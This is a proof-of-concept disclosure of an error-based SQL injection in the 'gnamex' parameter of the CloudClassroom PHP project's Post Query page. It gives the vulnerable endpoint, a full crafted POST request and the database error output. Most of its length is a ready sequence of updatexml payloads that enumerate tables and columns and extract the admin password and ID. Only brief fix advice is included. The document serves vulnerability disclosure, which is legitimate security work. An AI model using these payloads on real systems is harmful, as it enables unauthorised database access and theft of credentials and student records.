# CLOUD-CLASSROOMS-php-1.0 PoC - Sql Injection Erro Based

Presentation:
- Security vulnerability: SQL Injection
- Vulnerability Type: Injection
- Affected Component: Post Query functionality (postquerypublic)
- Software: CloudClassroom PHP Project
- Version: Latest available on GitHub (community project)
- Business area: Education / e-Learning Platforms

Describe the bug/issue:
A SQL Injection vulnerability exists in the Post Query feature of the CloudClassroom PHP Project.
The vulnerable parameter is gnamex (sent via POST), and the backend directly concatenates user input into SQL statements without proper sanitization or parameterized queries.

This allows an attacker to inject arbitrary SQL commands, enabling:

Extraction of sensitive information (user credentials, exam results, etc.)

Enumeration of databases, tables, and columns

Potential compromise of the entire application and underlying database

Evidence of Vulnerability:

The vulnerable endpoint:

http://<target>/CloudClassroom-PHP-Project-master/postquerypublic

Vulnerable parameter:

POST: gnamex
Original SQL code (from source):

$sql = "INSERT INTO `query`(`Query`, `Eid`) VALUES ('$tempsquery','$tempseid')";

Because the input is not sanitized, attackers can inject SQL like:

a' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) AND '1'='1

Steps to Reproduce:
Open the Post Query form at:

http://<target>/CloudClassroom-PHP-Project-master/postquerypublic
Intercept the request (e.g., with Burp Suite) or craft a manual POST:


POST /CloudClassroom-PHP-Project-master/postquerypublic
Content-Type: application/x-www-form-urlencoded

gnamex=a' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) AND '1'='1&email=test@test.com&squeryx=test&update=Post Query!

Observe the response returning:

XPATH syntax error: '~cc_db~'
Which reveals the current database name.

Impact:

Attackers can enumerate tables:

a' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e),1) AND '1'='1

Extract sensitive data (e.g., usernames, hashed passwords from admin table):

a' AND updatexml(1,concat(0x7e,(SELECT Apass FROM admin LIMIT 0,1),0x7e),1) AND '1'='1

Severity: High (CVSS 7.5) because it allows full database compromise.

Expected behavior:
The application should use parameterized queries (prepared statements) to handle user input securely, preventing any SQL code injection.

Bug Fix Recommendation:
Implement prepared statements in PHP using mysqli or PDO.

Use input validation and escaping.

Apply least privilege principle on the database user.

References:

CWE-89: SQL Injection

OWASP SQL Injection Prevention Cheat Sheet

Additional context:
Using blacklist-based filtering is not reliable. Attackers can bypass such filters easily by using encoding tricks, inline comments, or alternate syntax.



<img width="1388" height="684" alt="image" src="https://github.com/user-attachments/assets/1a96003b-e14f-4b81-9ab9-55cec3bda1ec" />


<img width="1318" height="705" alt="image" src="https://github.com/user-attachments/assets/e7b92457-4912-4004-9a13-20940ab0e74d" />

<img width="1332" height="691" alt="image" src="https://github.com/user-attachments/assets/6c090e3a-ac3f-482e-9f80-4d4b1cbb976f" />

<img width="974" height="688" alt="image" src="https://github.com/user-attachments/assets/d0267c7b-92d0-4f76-9938-6f49f13b0338" />

<img width="1290" height="683" alt="image" src="https://github.com/user-attachments/assets/835de28a-49ea-48b9-915d-f91c13590979" />

<img width="1357" height="675" alt="image" src="https://github.com/user-attachments/assets/df825170-7ec3-4a09-b217-2bcaf6e2d40c" />

<img width="1303" height="702" alt="image" src="https://github.com/user-attachments/assets/6a116325-cb3f-4b38-9502-dfa59eb25504" />

<img width="1315" height="694" alt="image" src="https://github.com/user-attachments/assets/6ef4cf56-d7c7-42db-b0fd-bdce2752535b" />

<img width="1368" height="666" alt="image" src="https://github.com/user-attachments/assets/2400409d-b7f7-45f6-b140-585867510790" />

<img width="1496" height="363" alt="image" src="https://github.com/user-attachments/assets/a8bbdbb6-b2fa-4879-b89e-2270c6af61cb" />

<img width="1491" height="397" alt="image" src="https://github.com/user-attachments/assets/ace6e519-6fcf-45b6-9df6-620ddcff9b97" />

<img width="1095" height="712" alt="image" src="https://github.com/user-attachments/assets/fcd7a3d3-9369-41f2-a322-54e1ce45bf17" />

<img width="1359" height="709" alt="image" src="https://github.com/user-attachments/assets/bce09fc3-51b6-4000-b1af-995b450f7bb6" />

<img width="1404" height="717" alt="image" src="https://github.com/user-attachments/assets/d2a90922-c391-459a-9656-163a933d039e" />

<img width="1348" height="702" alt="image" src="https://github.com/user-attachments/assets/1f9be308-1ad5-4e16-9275-ae51de452bc0" />

<img width="1401" height="706" alt="image" src="https://github.com/user-attachments/assets/f1933ec8-d2ca-431c-89c5-0eee74193501" />

<img width="1340" height="678" alt="image" src="https://github.com/user-attachments/assets/4377d5fd-6423-4eb6-b9f7-2df88b37430b" />

<img width="1339" height="686" alt="image" src="https://github.com/user-attachments/assets/648b0847-e327-4591-8380-16ff6a381287" />

<img width="1330" height="677" alt="image" src="https://github.com/user-attachments/assets/4abd07b9-f958-45c6-8c78-f44b2c994cb7" />


a' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) AND '1'='1

a' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e),1) AND '1'='1

a' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1),0x7e),1) AND '1'='1

a' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 2,1),0x7e),1) AND '1'='1

a' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 3,1),0x7e),1) AND '1'='1

a' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 4,1),0x7e),1) AND '1'='1

a' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 5,1),0x7e),1) AND '1'='1

a' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 6,1),0x7e),1) AND '1'='1

a' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 7,1),0x7e),1) AND '1'='1

a' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 8,1),0x7e),1) AND '1'='1

a' AND updatexml(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='examans' LIMIT 0,1),0x7e),1) AND '1'='1

a' AND updatexml(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='result' LIMIT 0,1),0x7e),1) AND '1'='1

a' AND updatexml(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='result' LIMIT 1,1),0x7e),1) AND '1'='1

a' AND updatexml(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='result' LIMIT 2,1),0x7e),1) AND '1'='1

a' AND updatexml(1,concat(0x7e,(SELECT RsID FROM result LIMIT 0,1),0x7e),1) AND '1'='1

a' AND updatexml(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='admin' LIMIT 0,1),0x7e),1) AND '1'='1

a' AND updatexml(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='admin' LIMIT 1,1),0x7e),1) AND '1'='1

a' AND updatexml(1,concat(0x7e,(SELECT Apass FROM admin LIMIT 0,1),0x7e),1) AND '1'='1  

a' AND updatexml(1,concat(0x7e,(SELECT Aid FROM admin LIMIT 0,1),0x7e),1) AND '1'='1




